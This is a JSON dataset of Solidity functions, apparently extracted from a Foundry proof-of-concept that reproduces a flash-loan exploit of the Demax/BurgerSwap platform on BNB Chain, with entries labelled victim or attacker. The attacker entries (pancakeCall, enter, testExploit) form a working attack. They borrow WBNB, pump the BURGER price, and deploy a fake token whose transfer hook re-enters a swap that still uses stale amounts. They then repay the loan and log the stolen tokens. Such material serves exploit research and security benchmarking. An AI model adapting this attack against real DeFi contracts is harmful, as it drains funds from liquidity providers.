[
  {
    "contract/interface": "IDemaxDelegate",
    "source_type": "victim_contract",
    "function_name": "addLiquidity",
    "original_code": "    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountA,\n        uint256 amountB,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        uint256 deadline\n    )\n        external\n        ensure(deadline)\n        returns (\n            uint256 _amountA,\n            uint256 _amountB,\n            uint256 _liquidity\n        )\n    {\n        require(!isPause, \"DEMAX PAUSED\");\n        (_amountA, _amountB) = _addLiquidity(tokenA, tokenB, amountA, amountB, amountAMin, amountBMin);\n        address pair = DemaxSwapLibrary.pairFor(FACTORY, tokenA, tokenB);\n        TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, _amountA);\n        TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, _amountB);\n\n        // notify pool\n        IDemaxPool(POOL).preProductivityChanged(pair, msg.sender);\n        _liquidity = IDemaxPair(pair).mint(msg.sender);\n        IDemaxPool(POOL).postProductivityChanged(pair, msg.sender);\n\n        _transferNotify(msg.sender, pair, tokenA, _amountA);\n        _transferNotify(msg.sender, pair, tokenB, _amountB);\n        emit AddLiquidity(msg.sender, tokenA, tokenB, _amountA, _amountB);\n    }\n\n    function addLiquidityETH(\n        address token,\n        uint256 amountTokenDesired,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        uint256 deadline\n    )\n        external\n        payable\n        ensure(deadline)\n        returns (\n            uint256 amountToken,\n            uint256 amountETH,\n            uint256 liquidity\n        )\n    {\n        require(!isPause, \"DEMAX PAUSED\");\n        (amountToken, amountETH) = _addLiquidity(\n            token,\n            WETH,\n            amountTokenDesired,\n            msg.value,\n            amountTokenMin,\n            amountETHMin\n        );\n        address pair = DemaxSwapLibrary.pairFor(FACTORY, token, WETH);\n        TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken);\n        IWETH(WETH).deposit{value: amountETH}();\n        assert(IWETH(WETH).transfer(pair, amountETH));\n\n        // notify pool\n        IDemaxPool(POOL).preProductivityChanged(pair, msg.sender);\n        liquidity = IDemaxPair(pair).mint(msg.sender);\n        IDemaxPool(POOL).postProductivityChanged(pair, msg.sender);\n\n        _transferNotify(msg.sender, pair, WETH, amountETH);\n        _transferNotify(msg.sender, pair, token, amountToken);\n        emit AddLiquidity(msg.sender, token, WETH, amountToken, amountETH);\n        if (msg.value > amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FAKE_TOKEN",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "FAKE_TOKEN",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FAKE_TOKEN",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "FAKE_TOKEN",
    "source_type": "victim_contract",
    "function_name": "disableExploit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "FAKE_TOKEN",
    "source_type": "victim_contract",
    "function_name": "enableExploit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "FAKE_TOKEN",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view returns (uint) {\n        return this.balance;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FAKE_TOKEN",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FAKE_TOKEN",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Pair",
    "source_type": "victim_contract",
    "function_name": "skim",
    "original_code": "    function skim(address to) external lock {\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));\n        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));\n    }\n\n    // force reserves to match balances\n",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Pair",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Pancake: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = (balance0.mul(10000).sub(amount0In.mul(25)));\n        uint balance1Adjusted = (balance1.mul(10000).sub(amount1In.mul(25)));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2), 'Pancake: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Pair",
    "source_type": "victim_contract",
    "function_name": "sync",
    "original_code": "    function sync() external lock {\n        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IDemaxPlatform",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokens",
    "original_code": "    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external ensure(deadline) returns (uint256[] memory amounts) {\n\n        uint256 percent = _getSwapFeePercent();\n        amounts = _getAmountsOut(amountIn, path, percent);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'DEMAX PLATFORM : INSUFFICIENT_OUTPUT_AMOUNT');\n        address pair = DemaxSwapLibrary.pairFor(FACTORY, path[0], path[1]);\n        _innerTransferFrom(\n            path[0],\n            msg.sender,\n            pair,\n            SafeMath.mul(amountIn, SafeMath.sub(PERCENT_DENOMINATOR, percent)) / PERCENT_DENOMINATOR\n        );\n        _swap(amounts, path, to);\n        _innerTransferFrom(path[0], msg.sender, pair, SafeMath.mul(amounts[0], percent) / PERCENT_DENOMINATOR);\n        _swapFee(amounts, path, percent);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDemaxPlatform",
    "source_type": "victim_contract",
    "function_name": "swapTokensForExactTokens",
    "original_code": "    function swapTokensForExactTokens(\n        uint256 amountOut,\n        uint256 amountInMax,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external ensure(deadline) returns (uint256[] memory amounts) {\n        uint256 percent = _getSwapFeePercent();\n        amounts = _getAmountsIn(amountOut, path, percent);\n        require(amounts[0] <= amountInMax, 'DEMAX PLATFORM : EXCESSIVE_INPUT_AMOUNT');\n        address pair = DemaxSwapLibrary.pairFor(FACTORY, path[0], path[1]);\n\n        _innerTransferFrom(\n            path[0],\n            msg.sender,\n            pair,\n            SafeMath.mul(amounts[0], SafeMath.sub(PERCENT_DENOMINATOR, percent)) / PERCENT_DENOMINATOR\n        );\n        _swap(amounts, path, to);\n        _innerTransferFrom(path[0], msg.sender, pair, SafeMath.mul(amounts[0], percent) / PERCENT_DENOMINATOR);\n        _swapFee(amounts, path, percent);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "enter",
    "original_code": "    function enter() public {\n        // swap another 45452 BURGER for 4478 WBNB (this inner BURGER -> WBNB swap uses the correct reserves) and is not locked yet\n        address[] memory path = new address[](2);\n        path[0] = address(BURGER);\n        path[1] = address(WBNB);\n        demaxPlatform.swapExactTokensForTokens(45_452 ether, 0, path, address(this), type(uint256).max);\n\n        FAKE.disableExploit();\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address, uint256, uint256 amount1, bytes memory) public {\n        // swap 6047 WBNB for 92677 BURGER (pump BURGER price)\n        WBNB.approve(address(demaxPlatform), type(uint256).max);\n        BURGER.approve(address(demaxPlatform), type(uint256).max);\n\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(BURGER);\n        demaxPlatform.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 0, path, address(this), type(uint256).max);\n\n        // create FAKE token, create FAKE<>BURGER pair and add 100 FAKE <> 45452 BURGER liquidity (addLiquidity() creates Pair if Pair doesn't exist)\n        FAKE = new FAKE_TOKEN(address(this));\n\n        FAKE.approve(address(demaxPlatform), type(uint256).max);\n        BURGER.approve(address(demaxDelegate), type(uint256).max);\n        demaxDelegate.addLiquidity(address(FAKE), address(BURGER), 100, 45_452 ether, 0, 0, type(uint256).max); // 47225 BURGER left after addLiquidity()\n\n        FAKE.enableExploit();\n\n        // use malicious path to swap 1 FAKE -> 45452 BURGER -> 4478 WBNB (will use false amounts which were already calculated before the inner swap) [Second swap]\n        //                          and another 45452 BURGER -> 4478 WBNB (same price, no slippage incurred) [First swap]\n        /*  \n        WBNB -> BURGER ----> FAKE <> BURGER \n\n        FAKE -----------------> BURGER -> WBNB\n            |               ^\n            v               |\n            BURGER -> WBNB  | \n        */\n        address[] memory path2 = new address[](3);\n        path2[0] = address(FAKE);\n        path2[1] = address(BURGER);\n        path2[2] = address(WBNB);\n        demaxPlatform.swapExactTokensForTokens(1 ether, 0, path2, address(this), type(uint256).max); // trigger transferFrom() hook in FAKE then enter()\n\n        // swap 494 WBNB for 108k BURGER (small amount of WBNB for large amount of BURGER) to bring back normal price\n        path[0] = address(WBNB);\n        path[1] = address(BURGER);\n        demaxPlatform.swapTokensForExactTokens(108_791 ether, 494 ether, path, address(this), type(uint256).max);\n\n        // repay 0.3% fee\n        WBNB.transfer(address(USDT_WBNB), amount1 * 1000 / 997);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 7_781_159);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // BURGER and WBNB in Pair before: 164603 <> 3038\n        USDT_WBNB.swap(0, 6_047_132_230_250_298_663_393, address(this), \"Flashloan 6047 WBNB\");\n        // BURGER and WBNB in Pair after: 53606 <> 622\n\n        console.log(\"BURGER exploited:\", BURGER.balanceOf(address(this)) / 1e18);\n        console.log(\"WBNB exploited:\", WBNB.balanceOf(address(this)) / 1e18);\n    }\n\n",
    "description": ""
  }
]